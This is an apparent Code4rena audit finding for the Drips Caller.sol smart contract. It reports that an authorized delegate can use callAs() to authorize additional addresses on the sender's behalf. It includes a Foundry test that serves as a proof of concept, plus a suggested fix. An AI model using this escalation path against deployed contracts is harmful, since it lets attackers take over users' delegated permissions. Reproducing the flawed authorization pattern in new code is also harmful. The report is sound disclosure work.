# Original link
https://github.com/code-423n4/2023-01-drips-findings/issues/124
# Lines of code

https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L106
https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L114
https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L144
https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L202


# Vulnerability details

## Impact

The Caller.sol contract helps to call functions on behalf of other addresses. The sender can [authorize](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L106) an address in order to make calls on behalf the sender.

The issue is that the authorized user can authorize/unauthorize other users from the sender using the [callAs() function](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Caller.sol#L144).

The ```authorized user assigned by the sender can manage the sender authorized users list```. 
The authorize/unauthorize actions should be reserved only by the original sender otherwise the malicious authorized user can manage the list at his convenience.

## Proof of Concept

I created a basic PoC in ```Caller.t.sol```. Test steps:

1. Authorize the address(122) for the sender authorized list.
2. As the address(122) call callAs() function with authorize selector and add address(1337) to the sender authorized user list.
3. The sender allAuthorized() list now have address(122) and address(1337).

```solidity
function testAuthorizeViaCallAs() public {
    // Authorize another address via callAs
    // 1. Authorize the address(122) for the sender.
    // 2. As the address(122) call callAs() function with authorize selector
    // and add address(1337) to the sender authorized user list.
    // 3. The sender allAuthorized() list now have address(122) and address(1337)
    address[] memory allAuthorized;
    //
    // 1. Authorize the address(122) for the sender.
    //
    authorize(sender, address(122));//sender authorize address(122)
    allAuthorized = new address[](1);
    allAuthorized[0] = address(122);
    assertEq(caller.allAuthorized(sender), allAuthorized, "Invalid all authorized");
    //
    // 2. As the address(122) call callAs() function with authorize selector
    // and add address(1337) to the sender authorized user list.
    //
    address anotherAddress = address(1337);
    bytes memory data = abi.encodeWithSelector(caller.authorize.selector, anotherAddress);
    vm.prank(address(122));
    bytes memory returned = caller.callAs{value: 0}(sender, address(caller), data);
    // 3. The sender allAuthorized() list now have address(122) and address(1337)
    allAuthorized = new address[](2);
    allAuthorized[0] = address(122);
    allAuthorized[1] = address(1337);// <-- this new address is authorized by the address(122)
    assertEq(caller.allAuthorized(sender), allAuthorized, "Invalid all authorized");
}
```

## Tools used

Foundry/Vscode

## Recommended Mitigation Steps

Add a restriction to not modify the sender authorized user list by the ```authorized user```. It could be in the ```_callAs()``` function.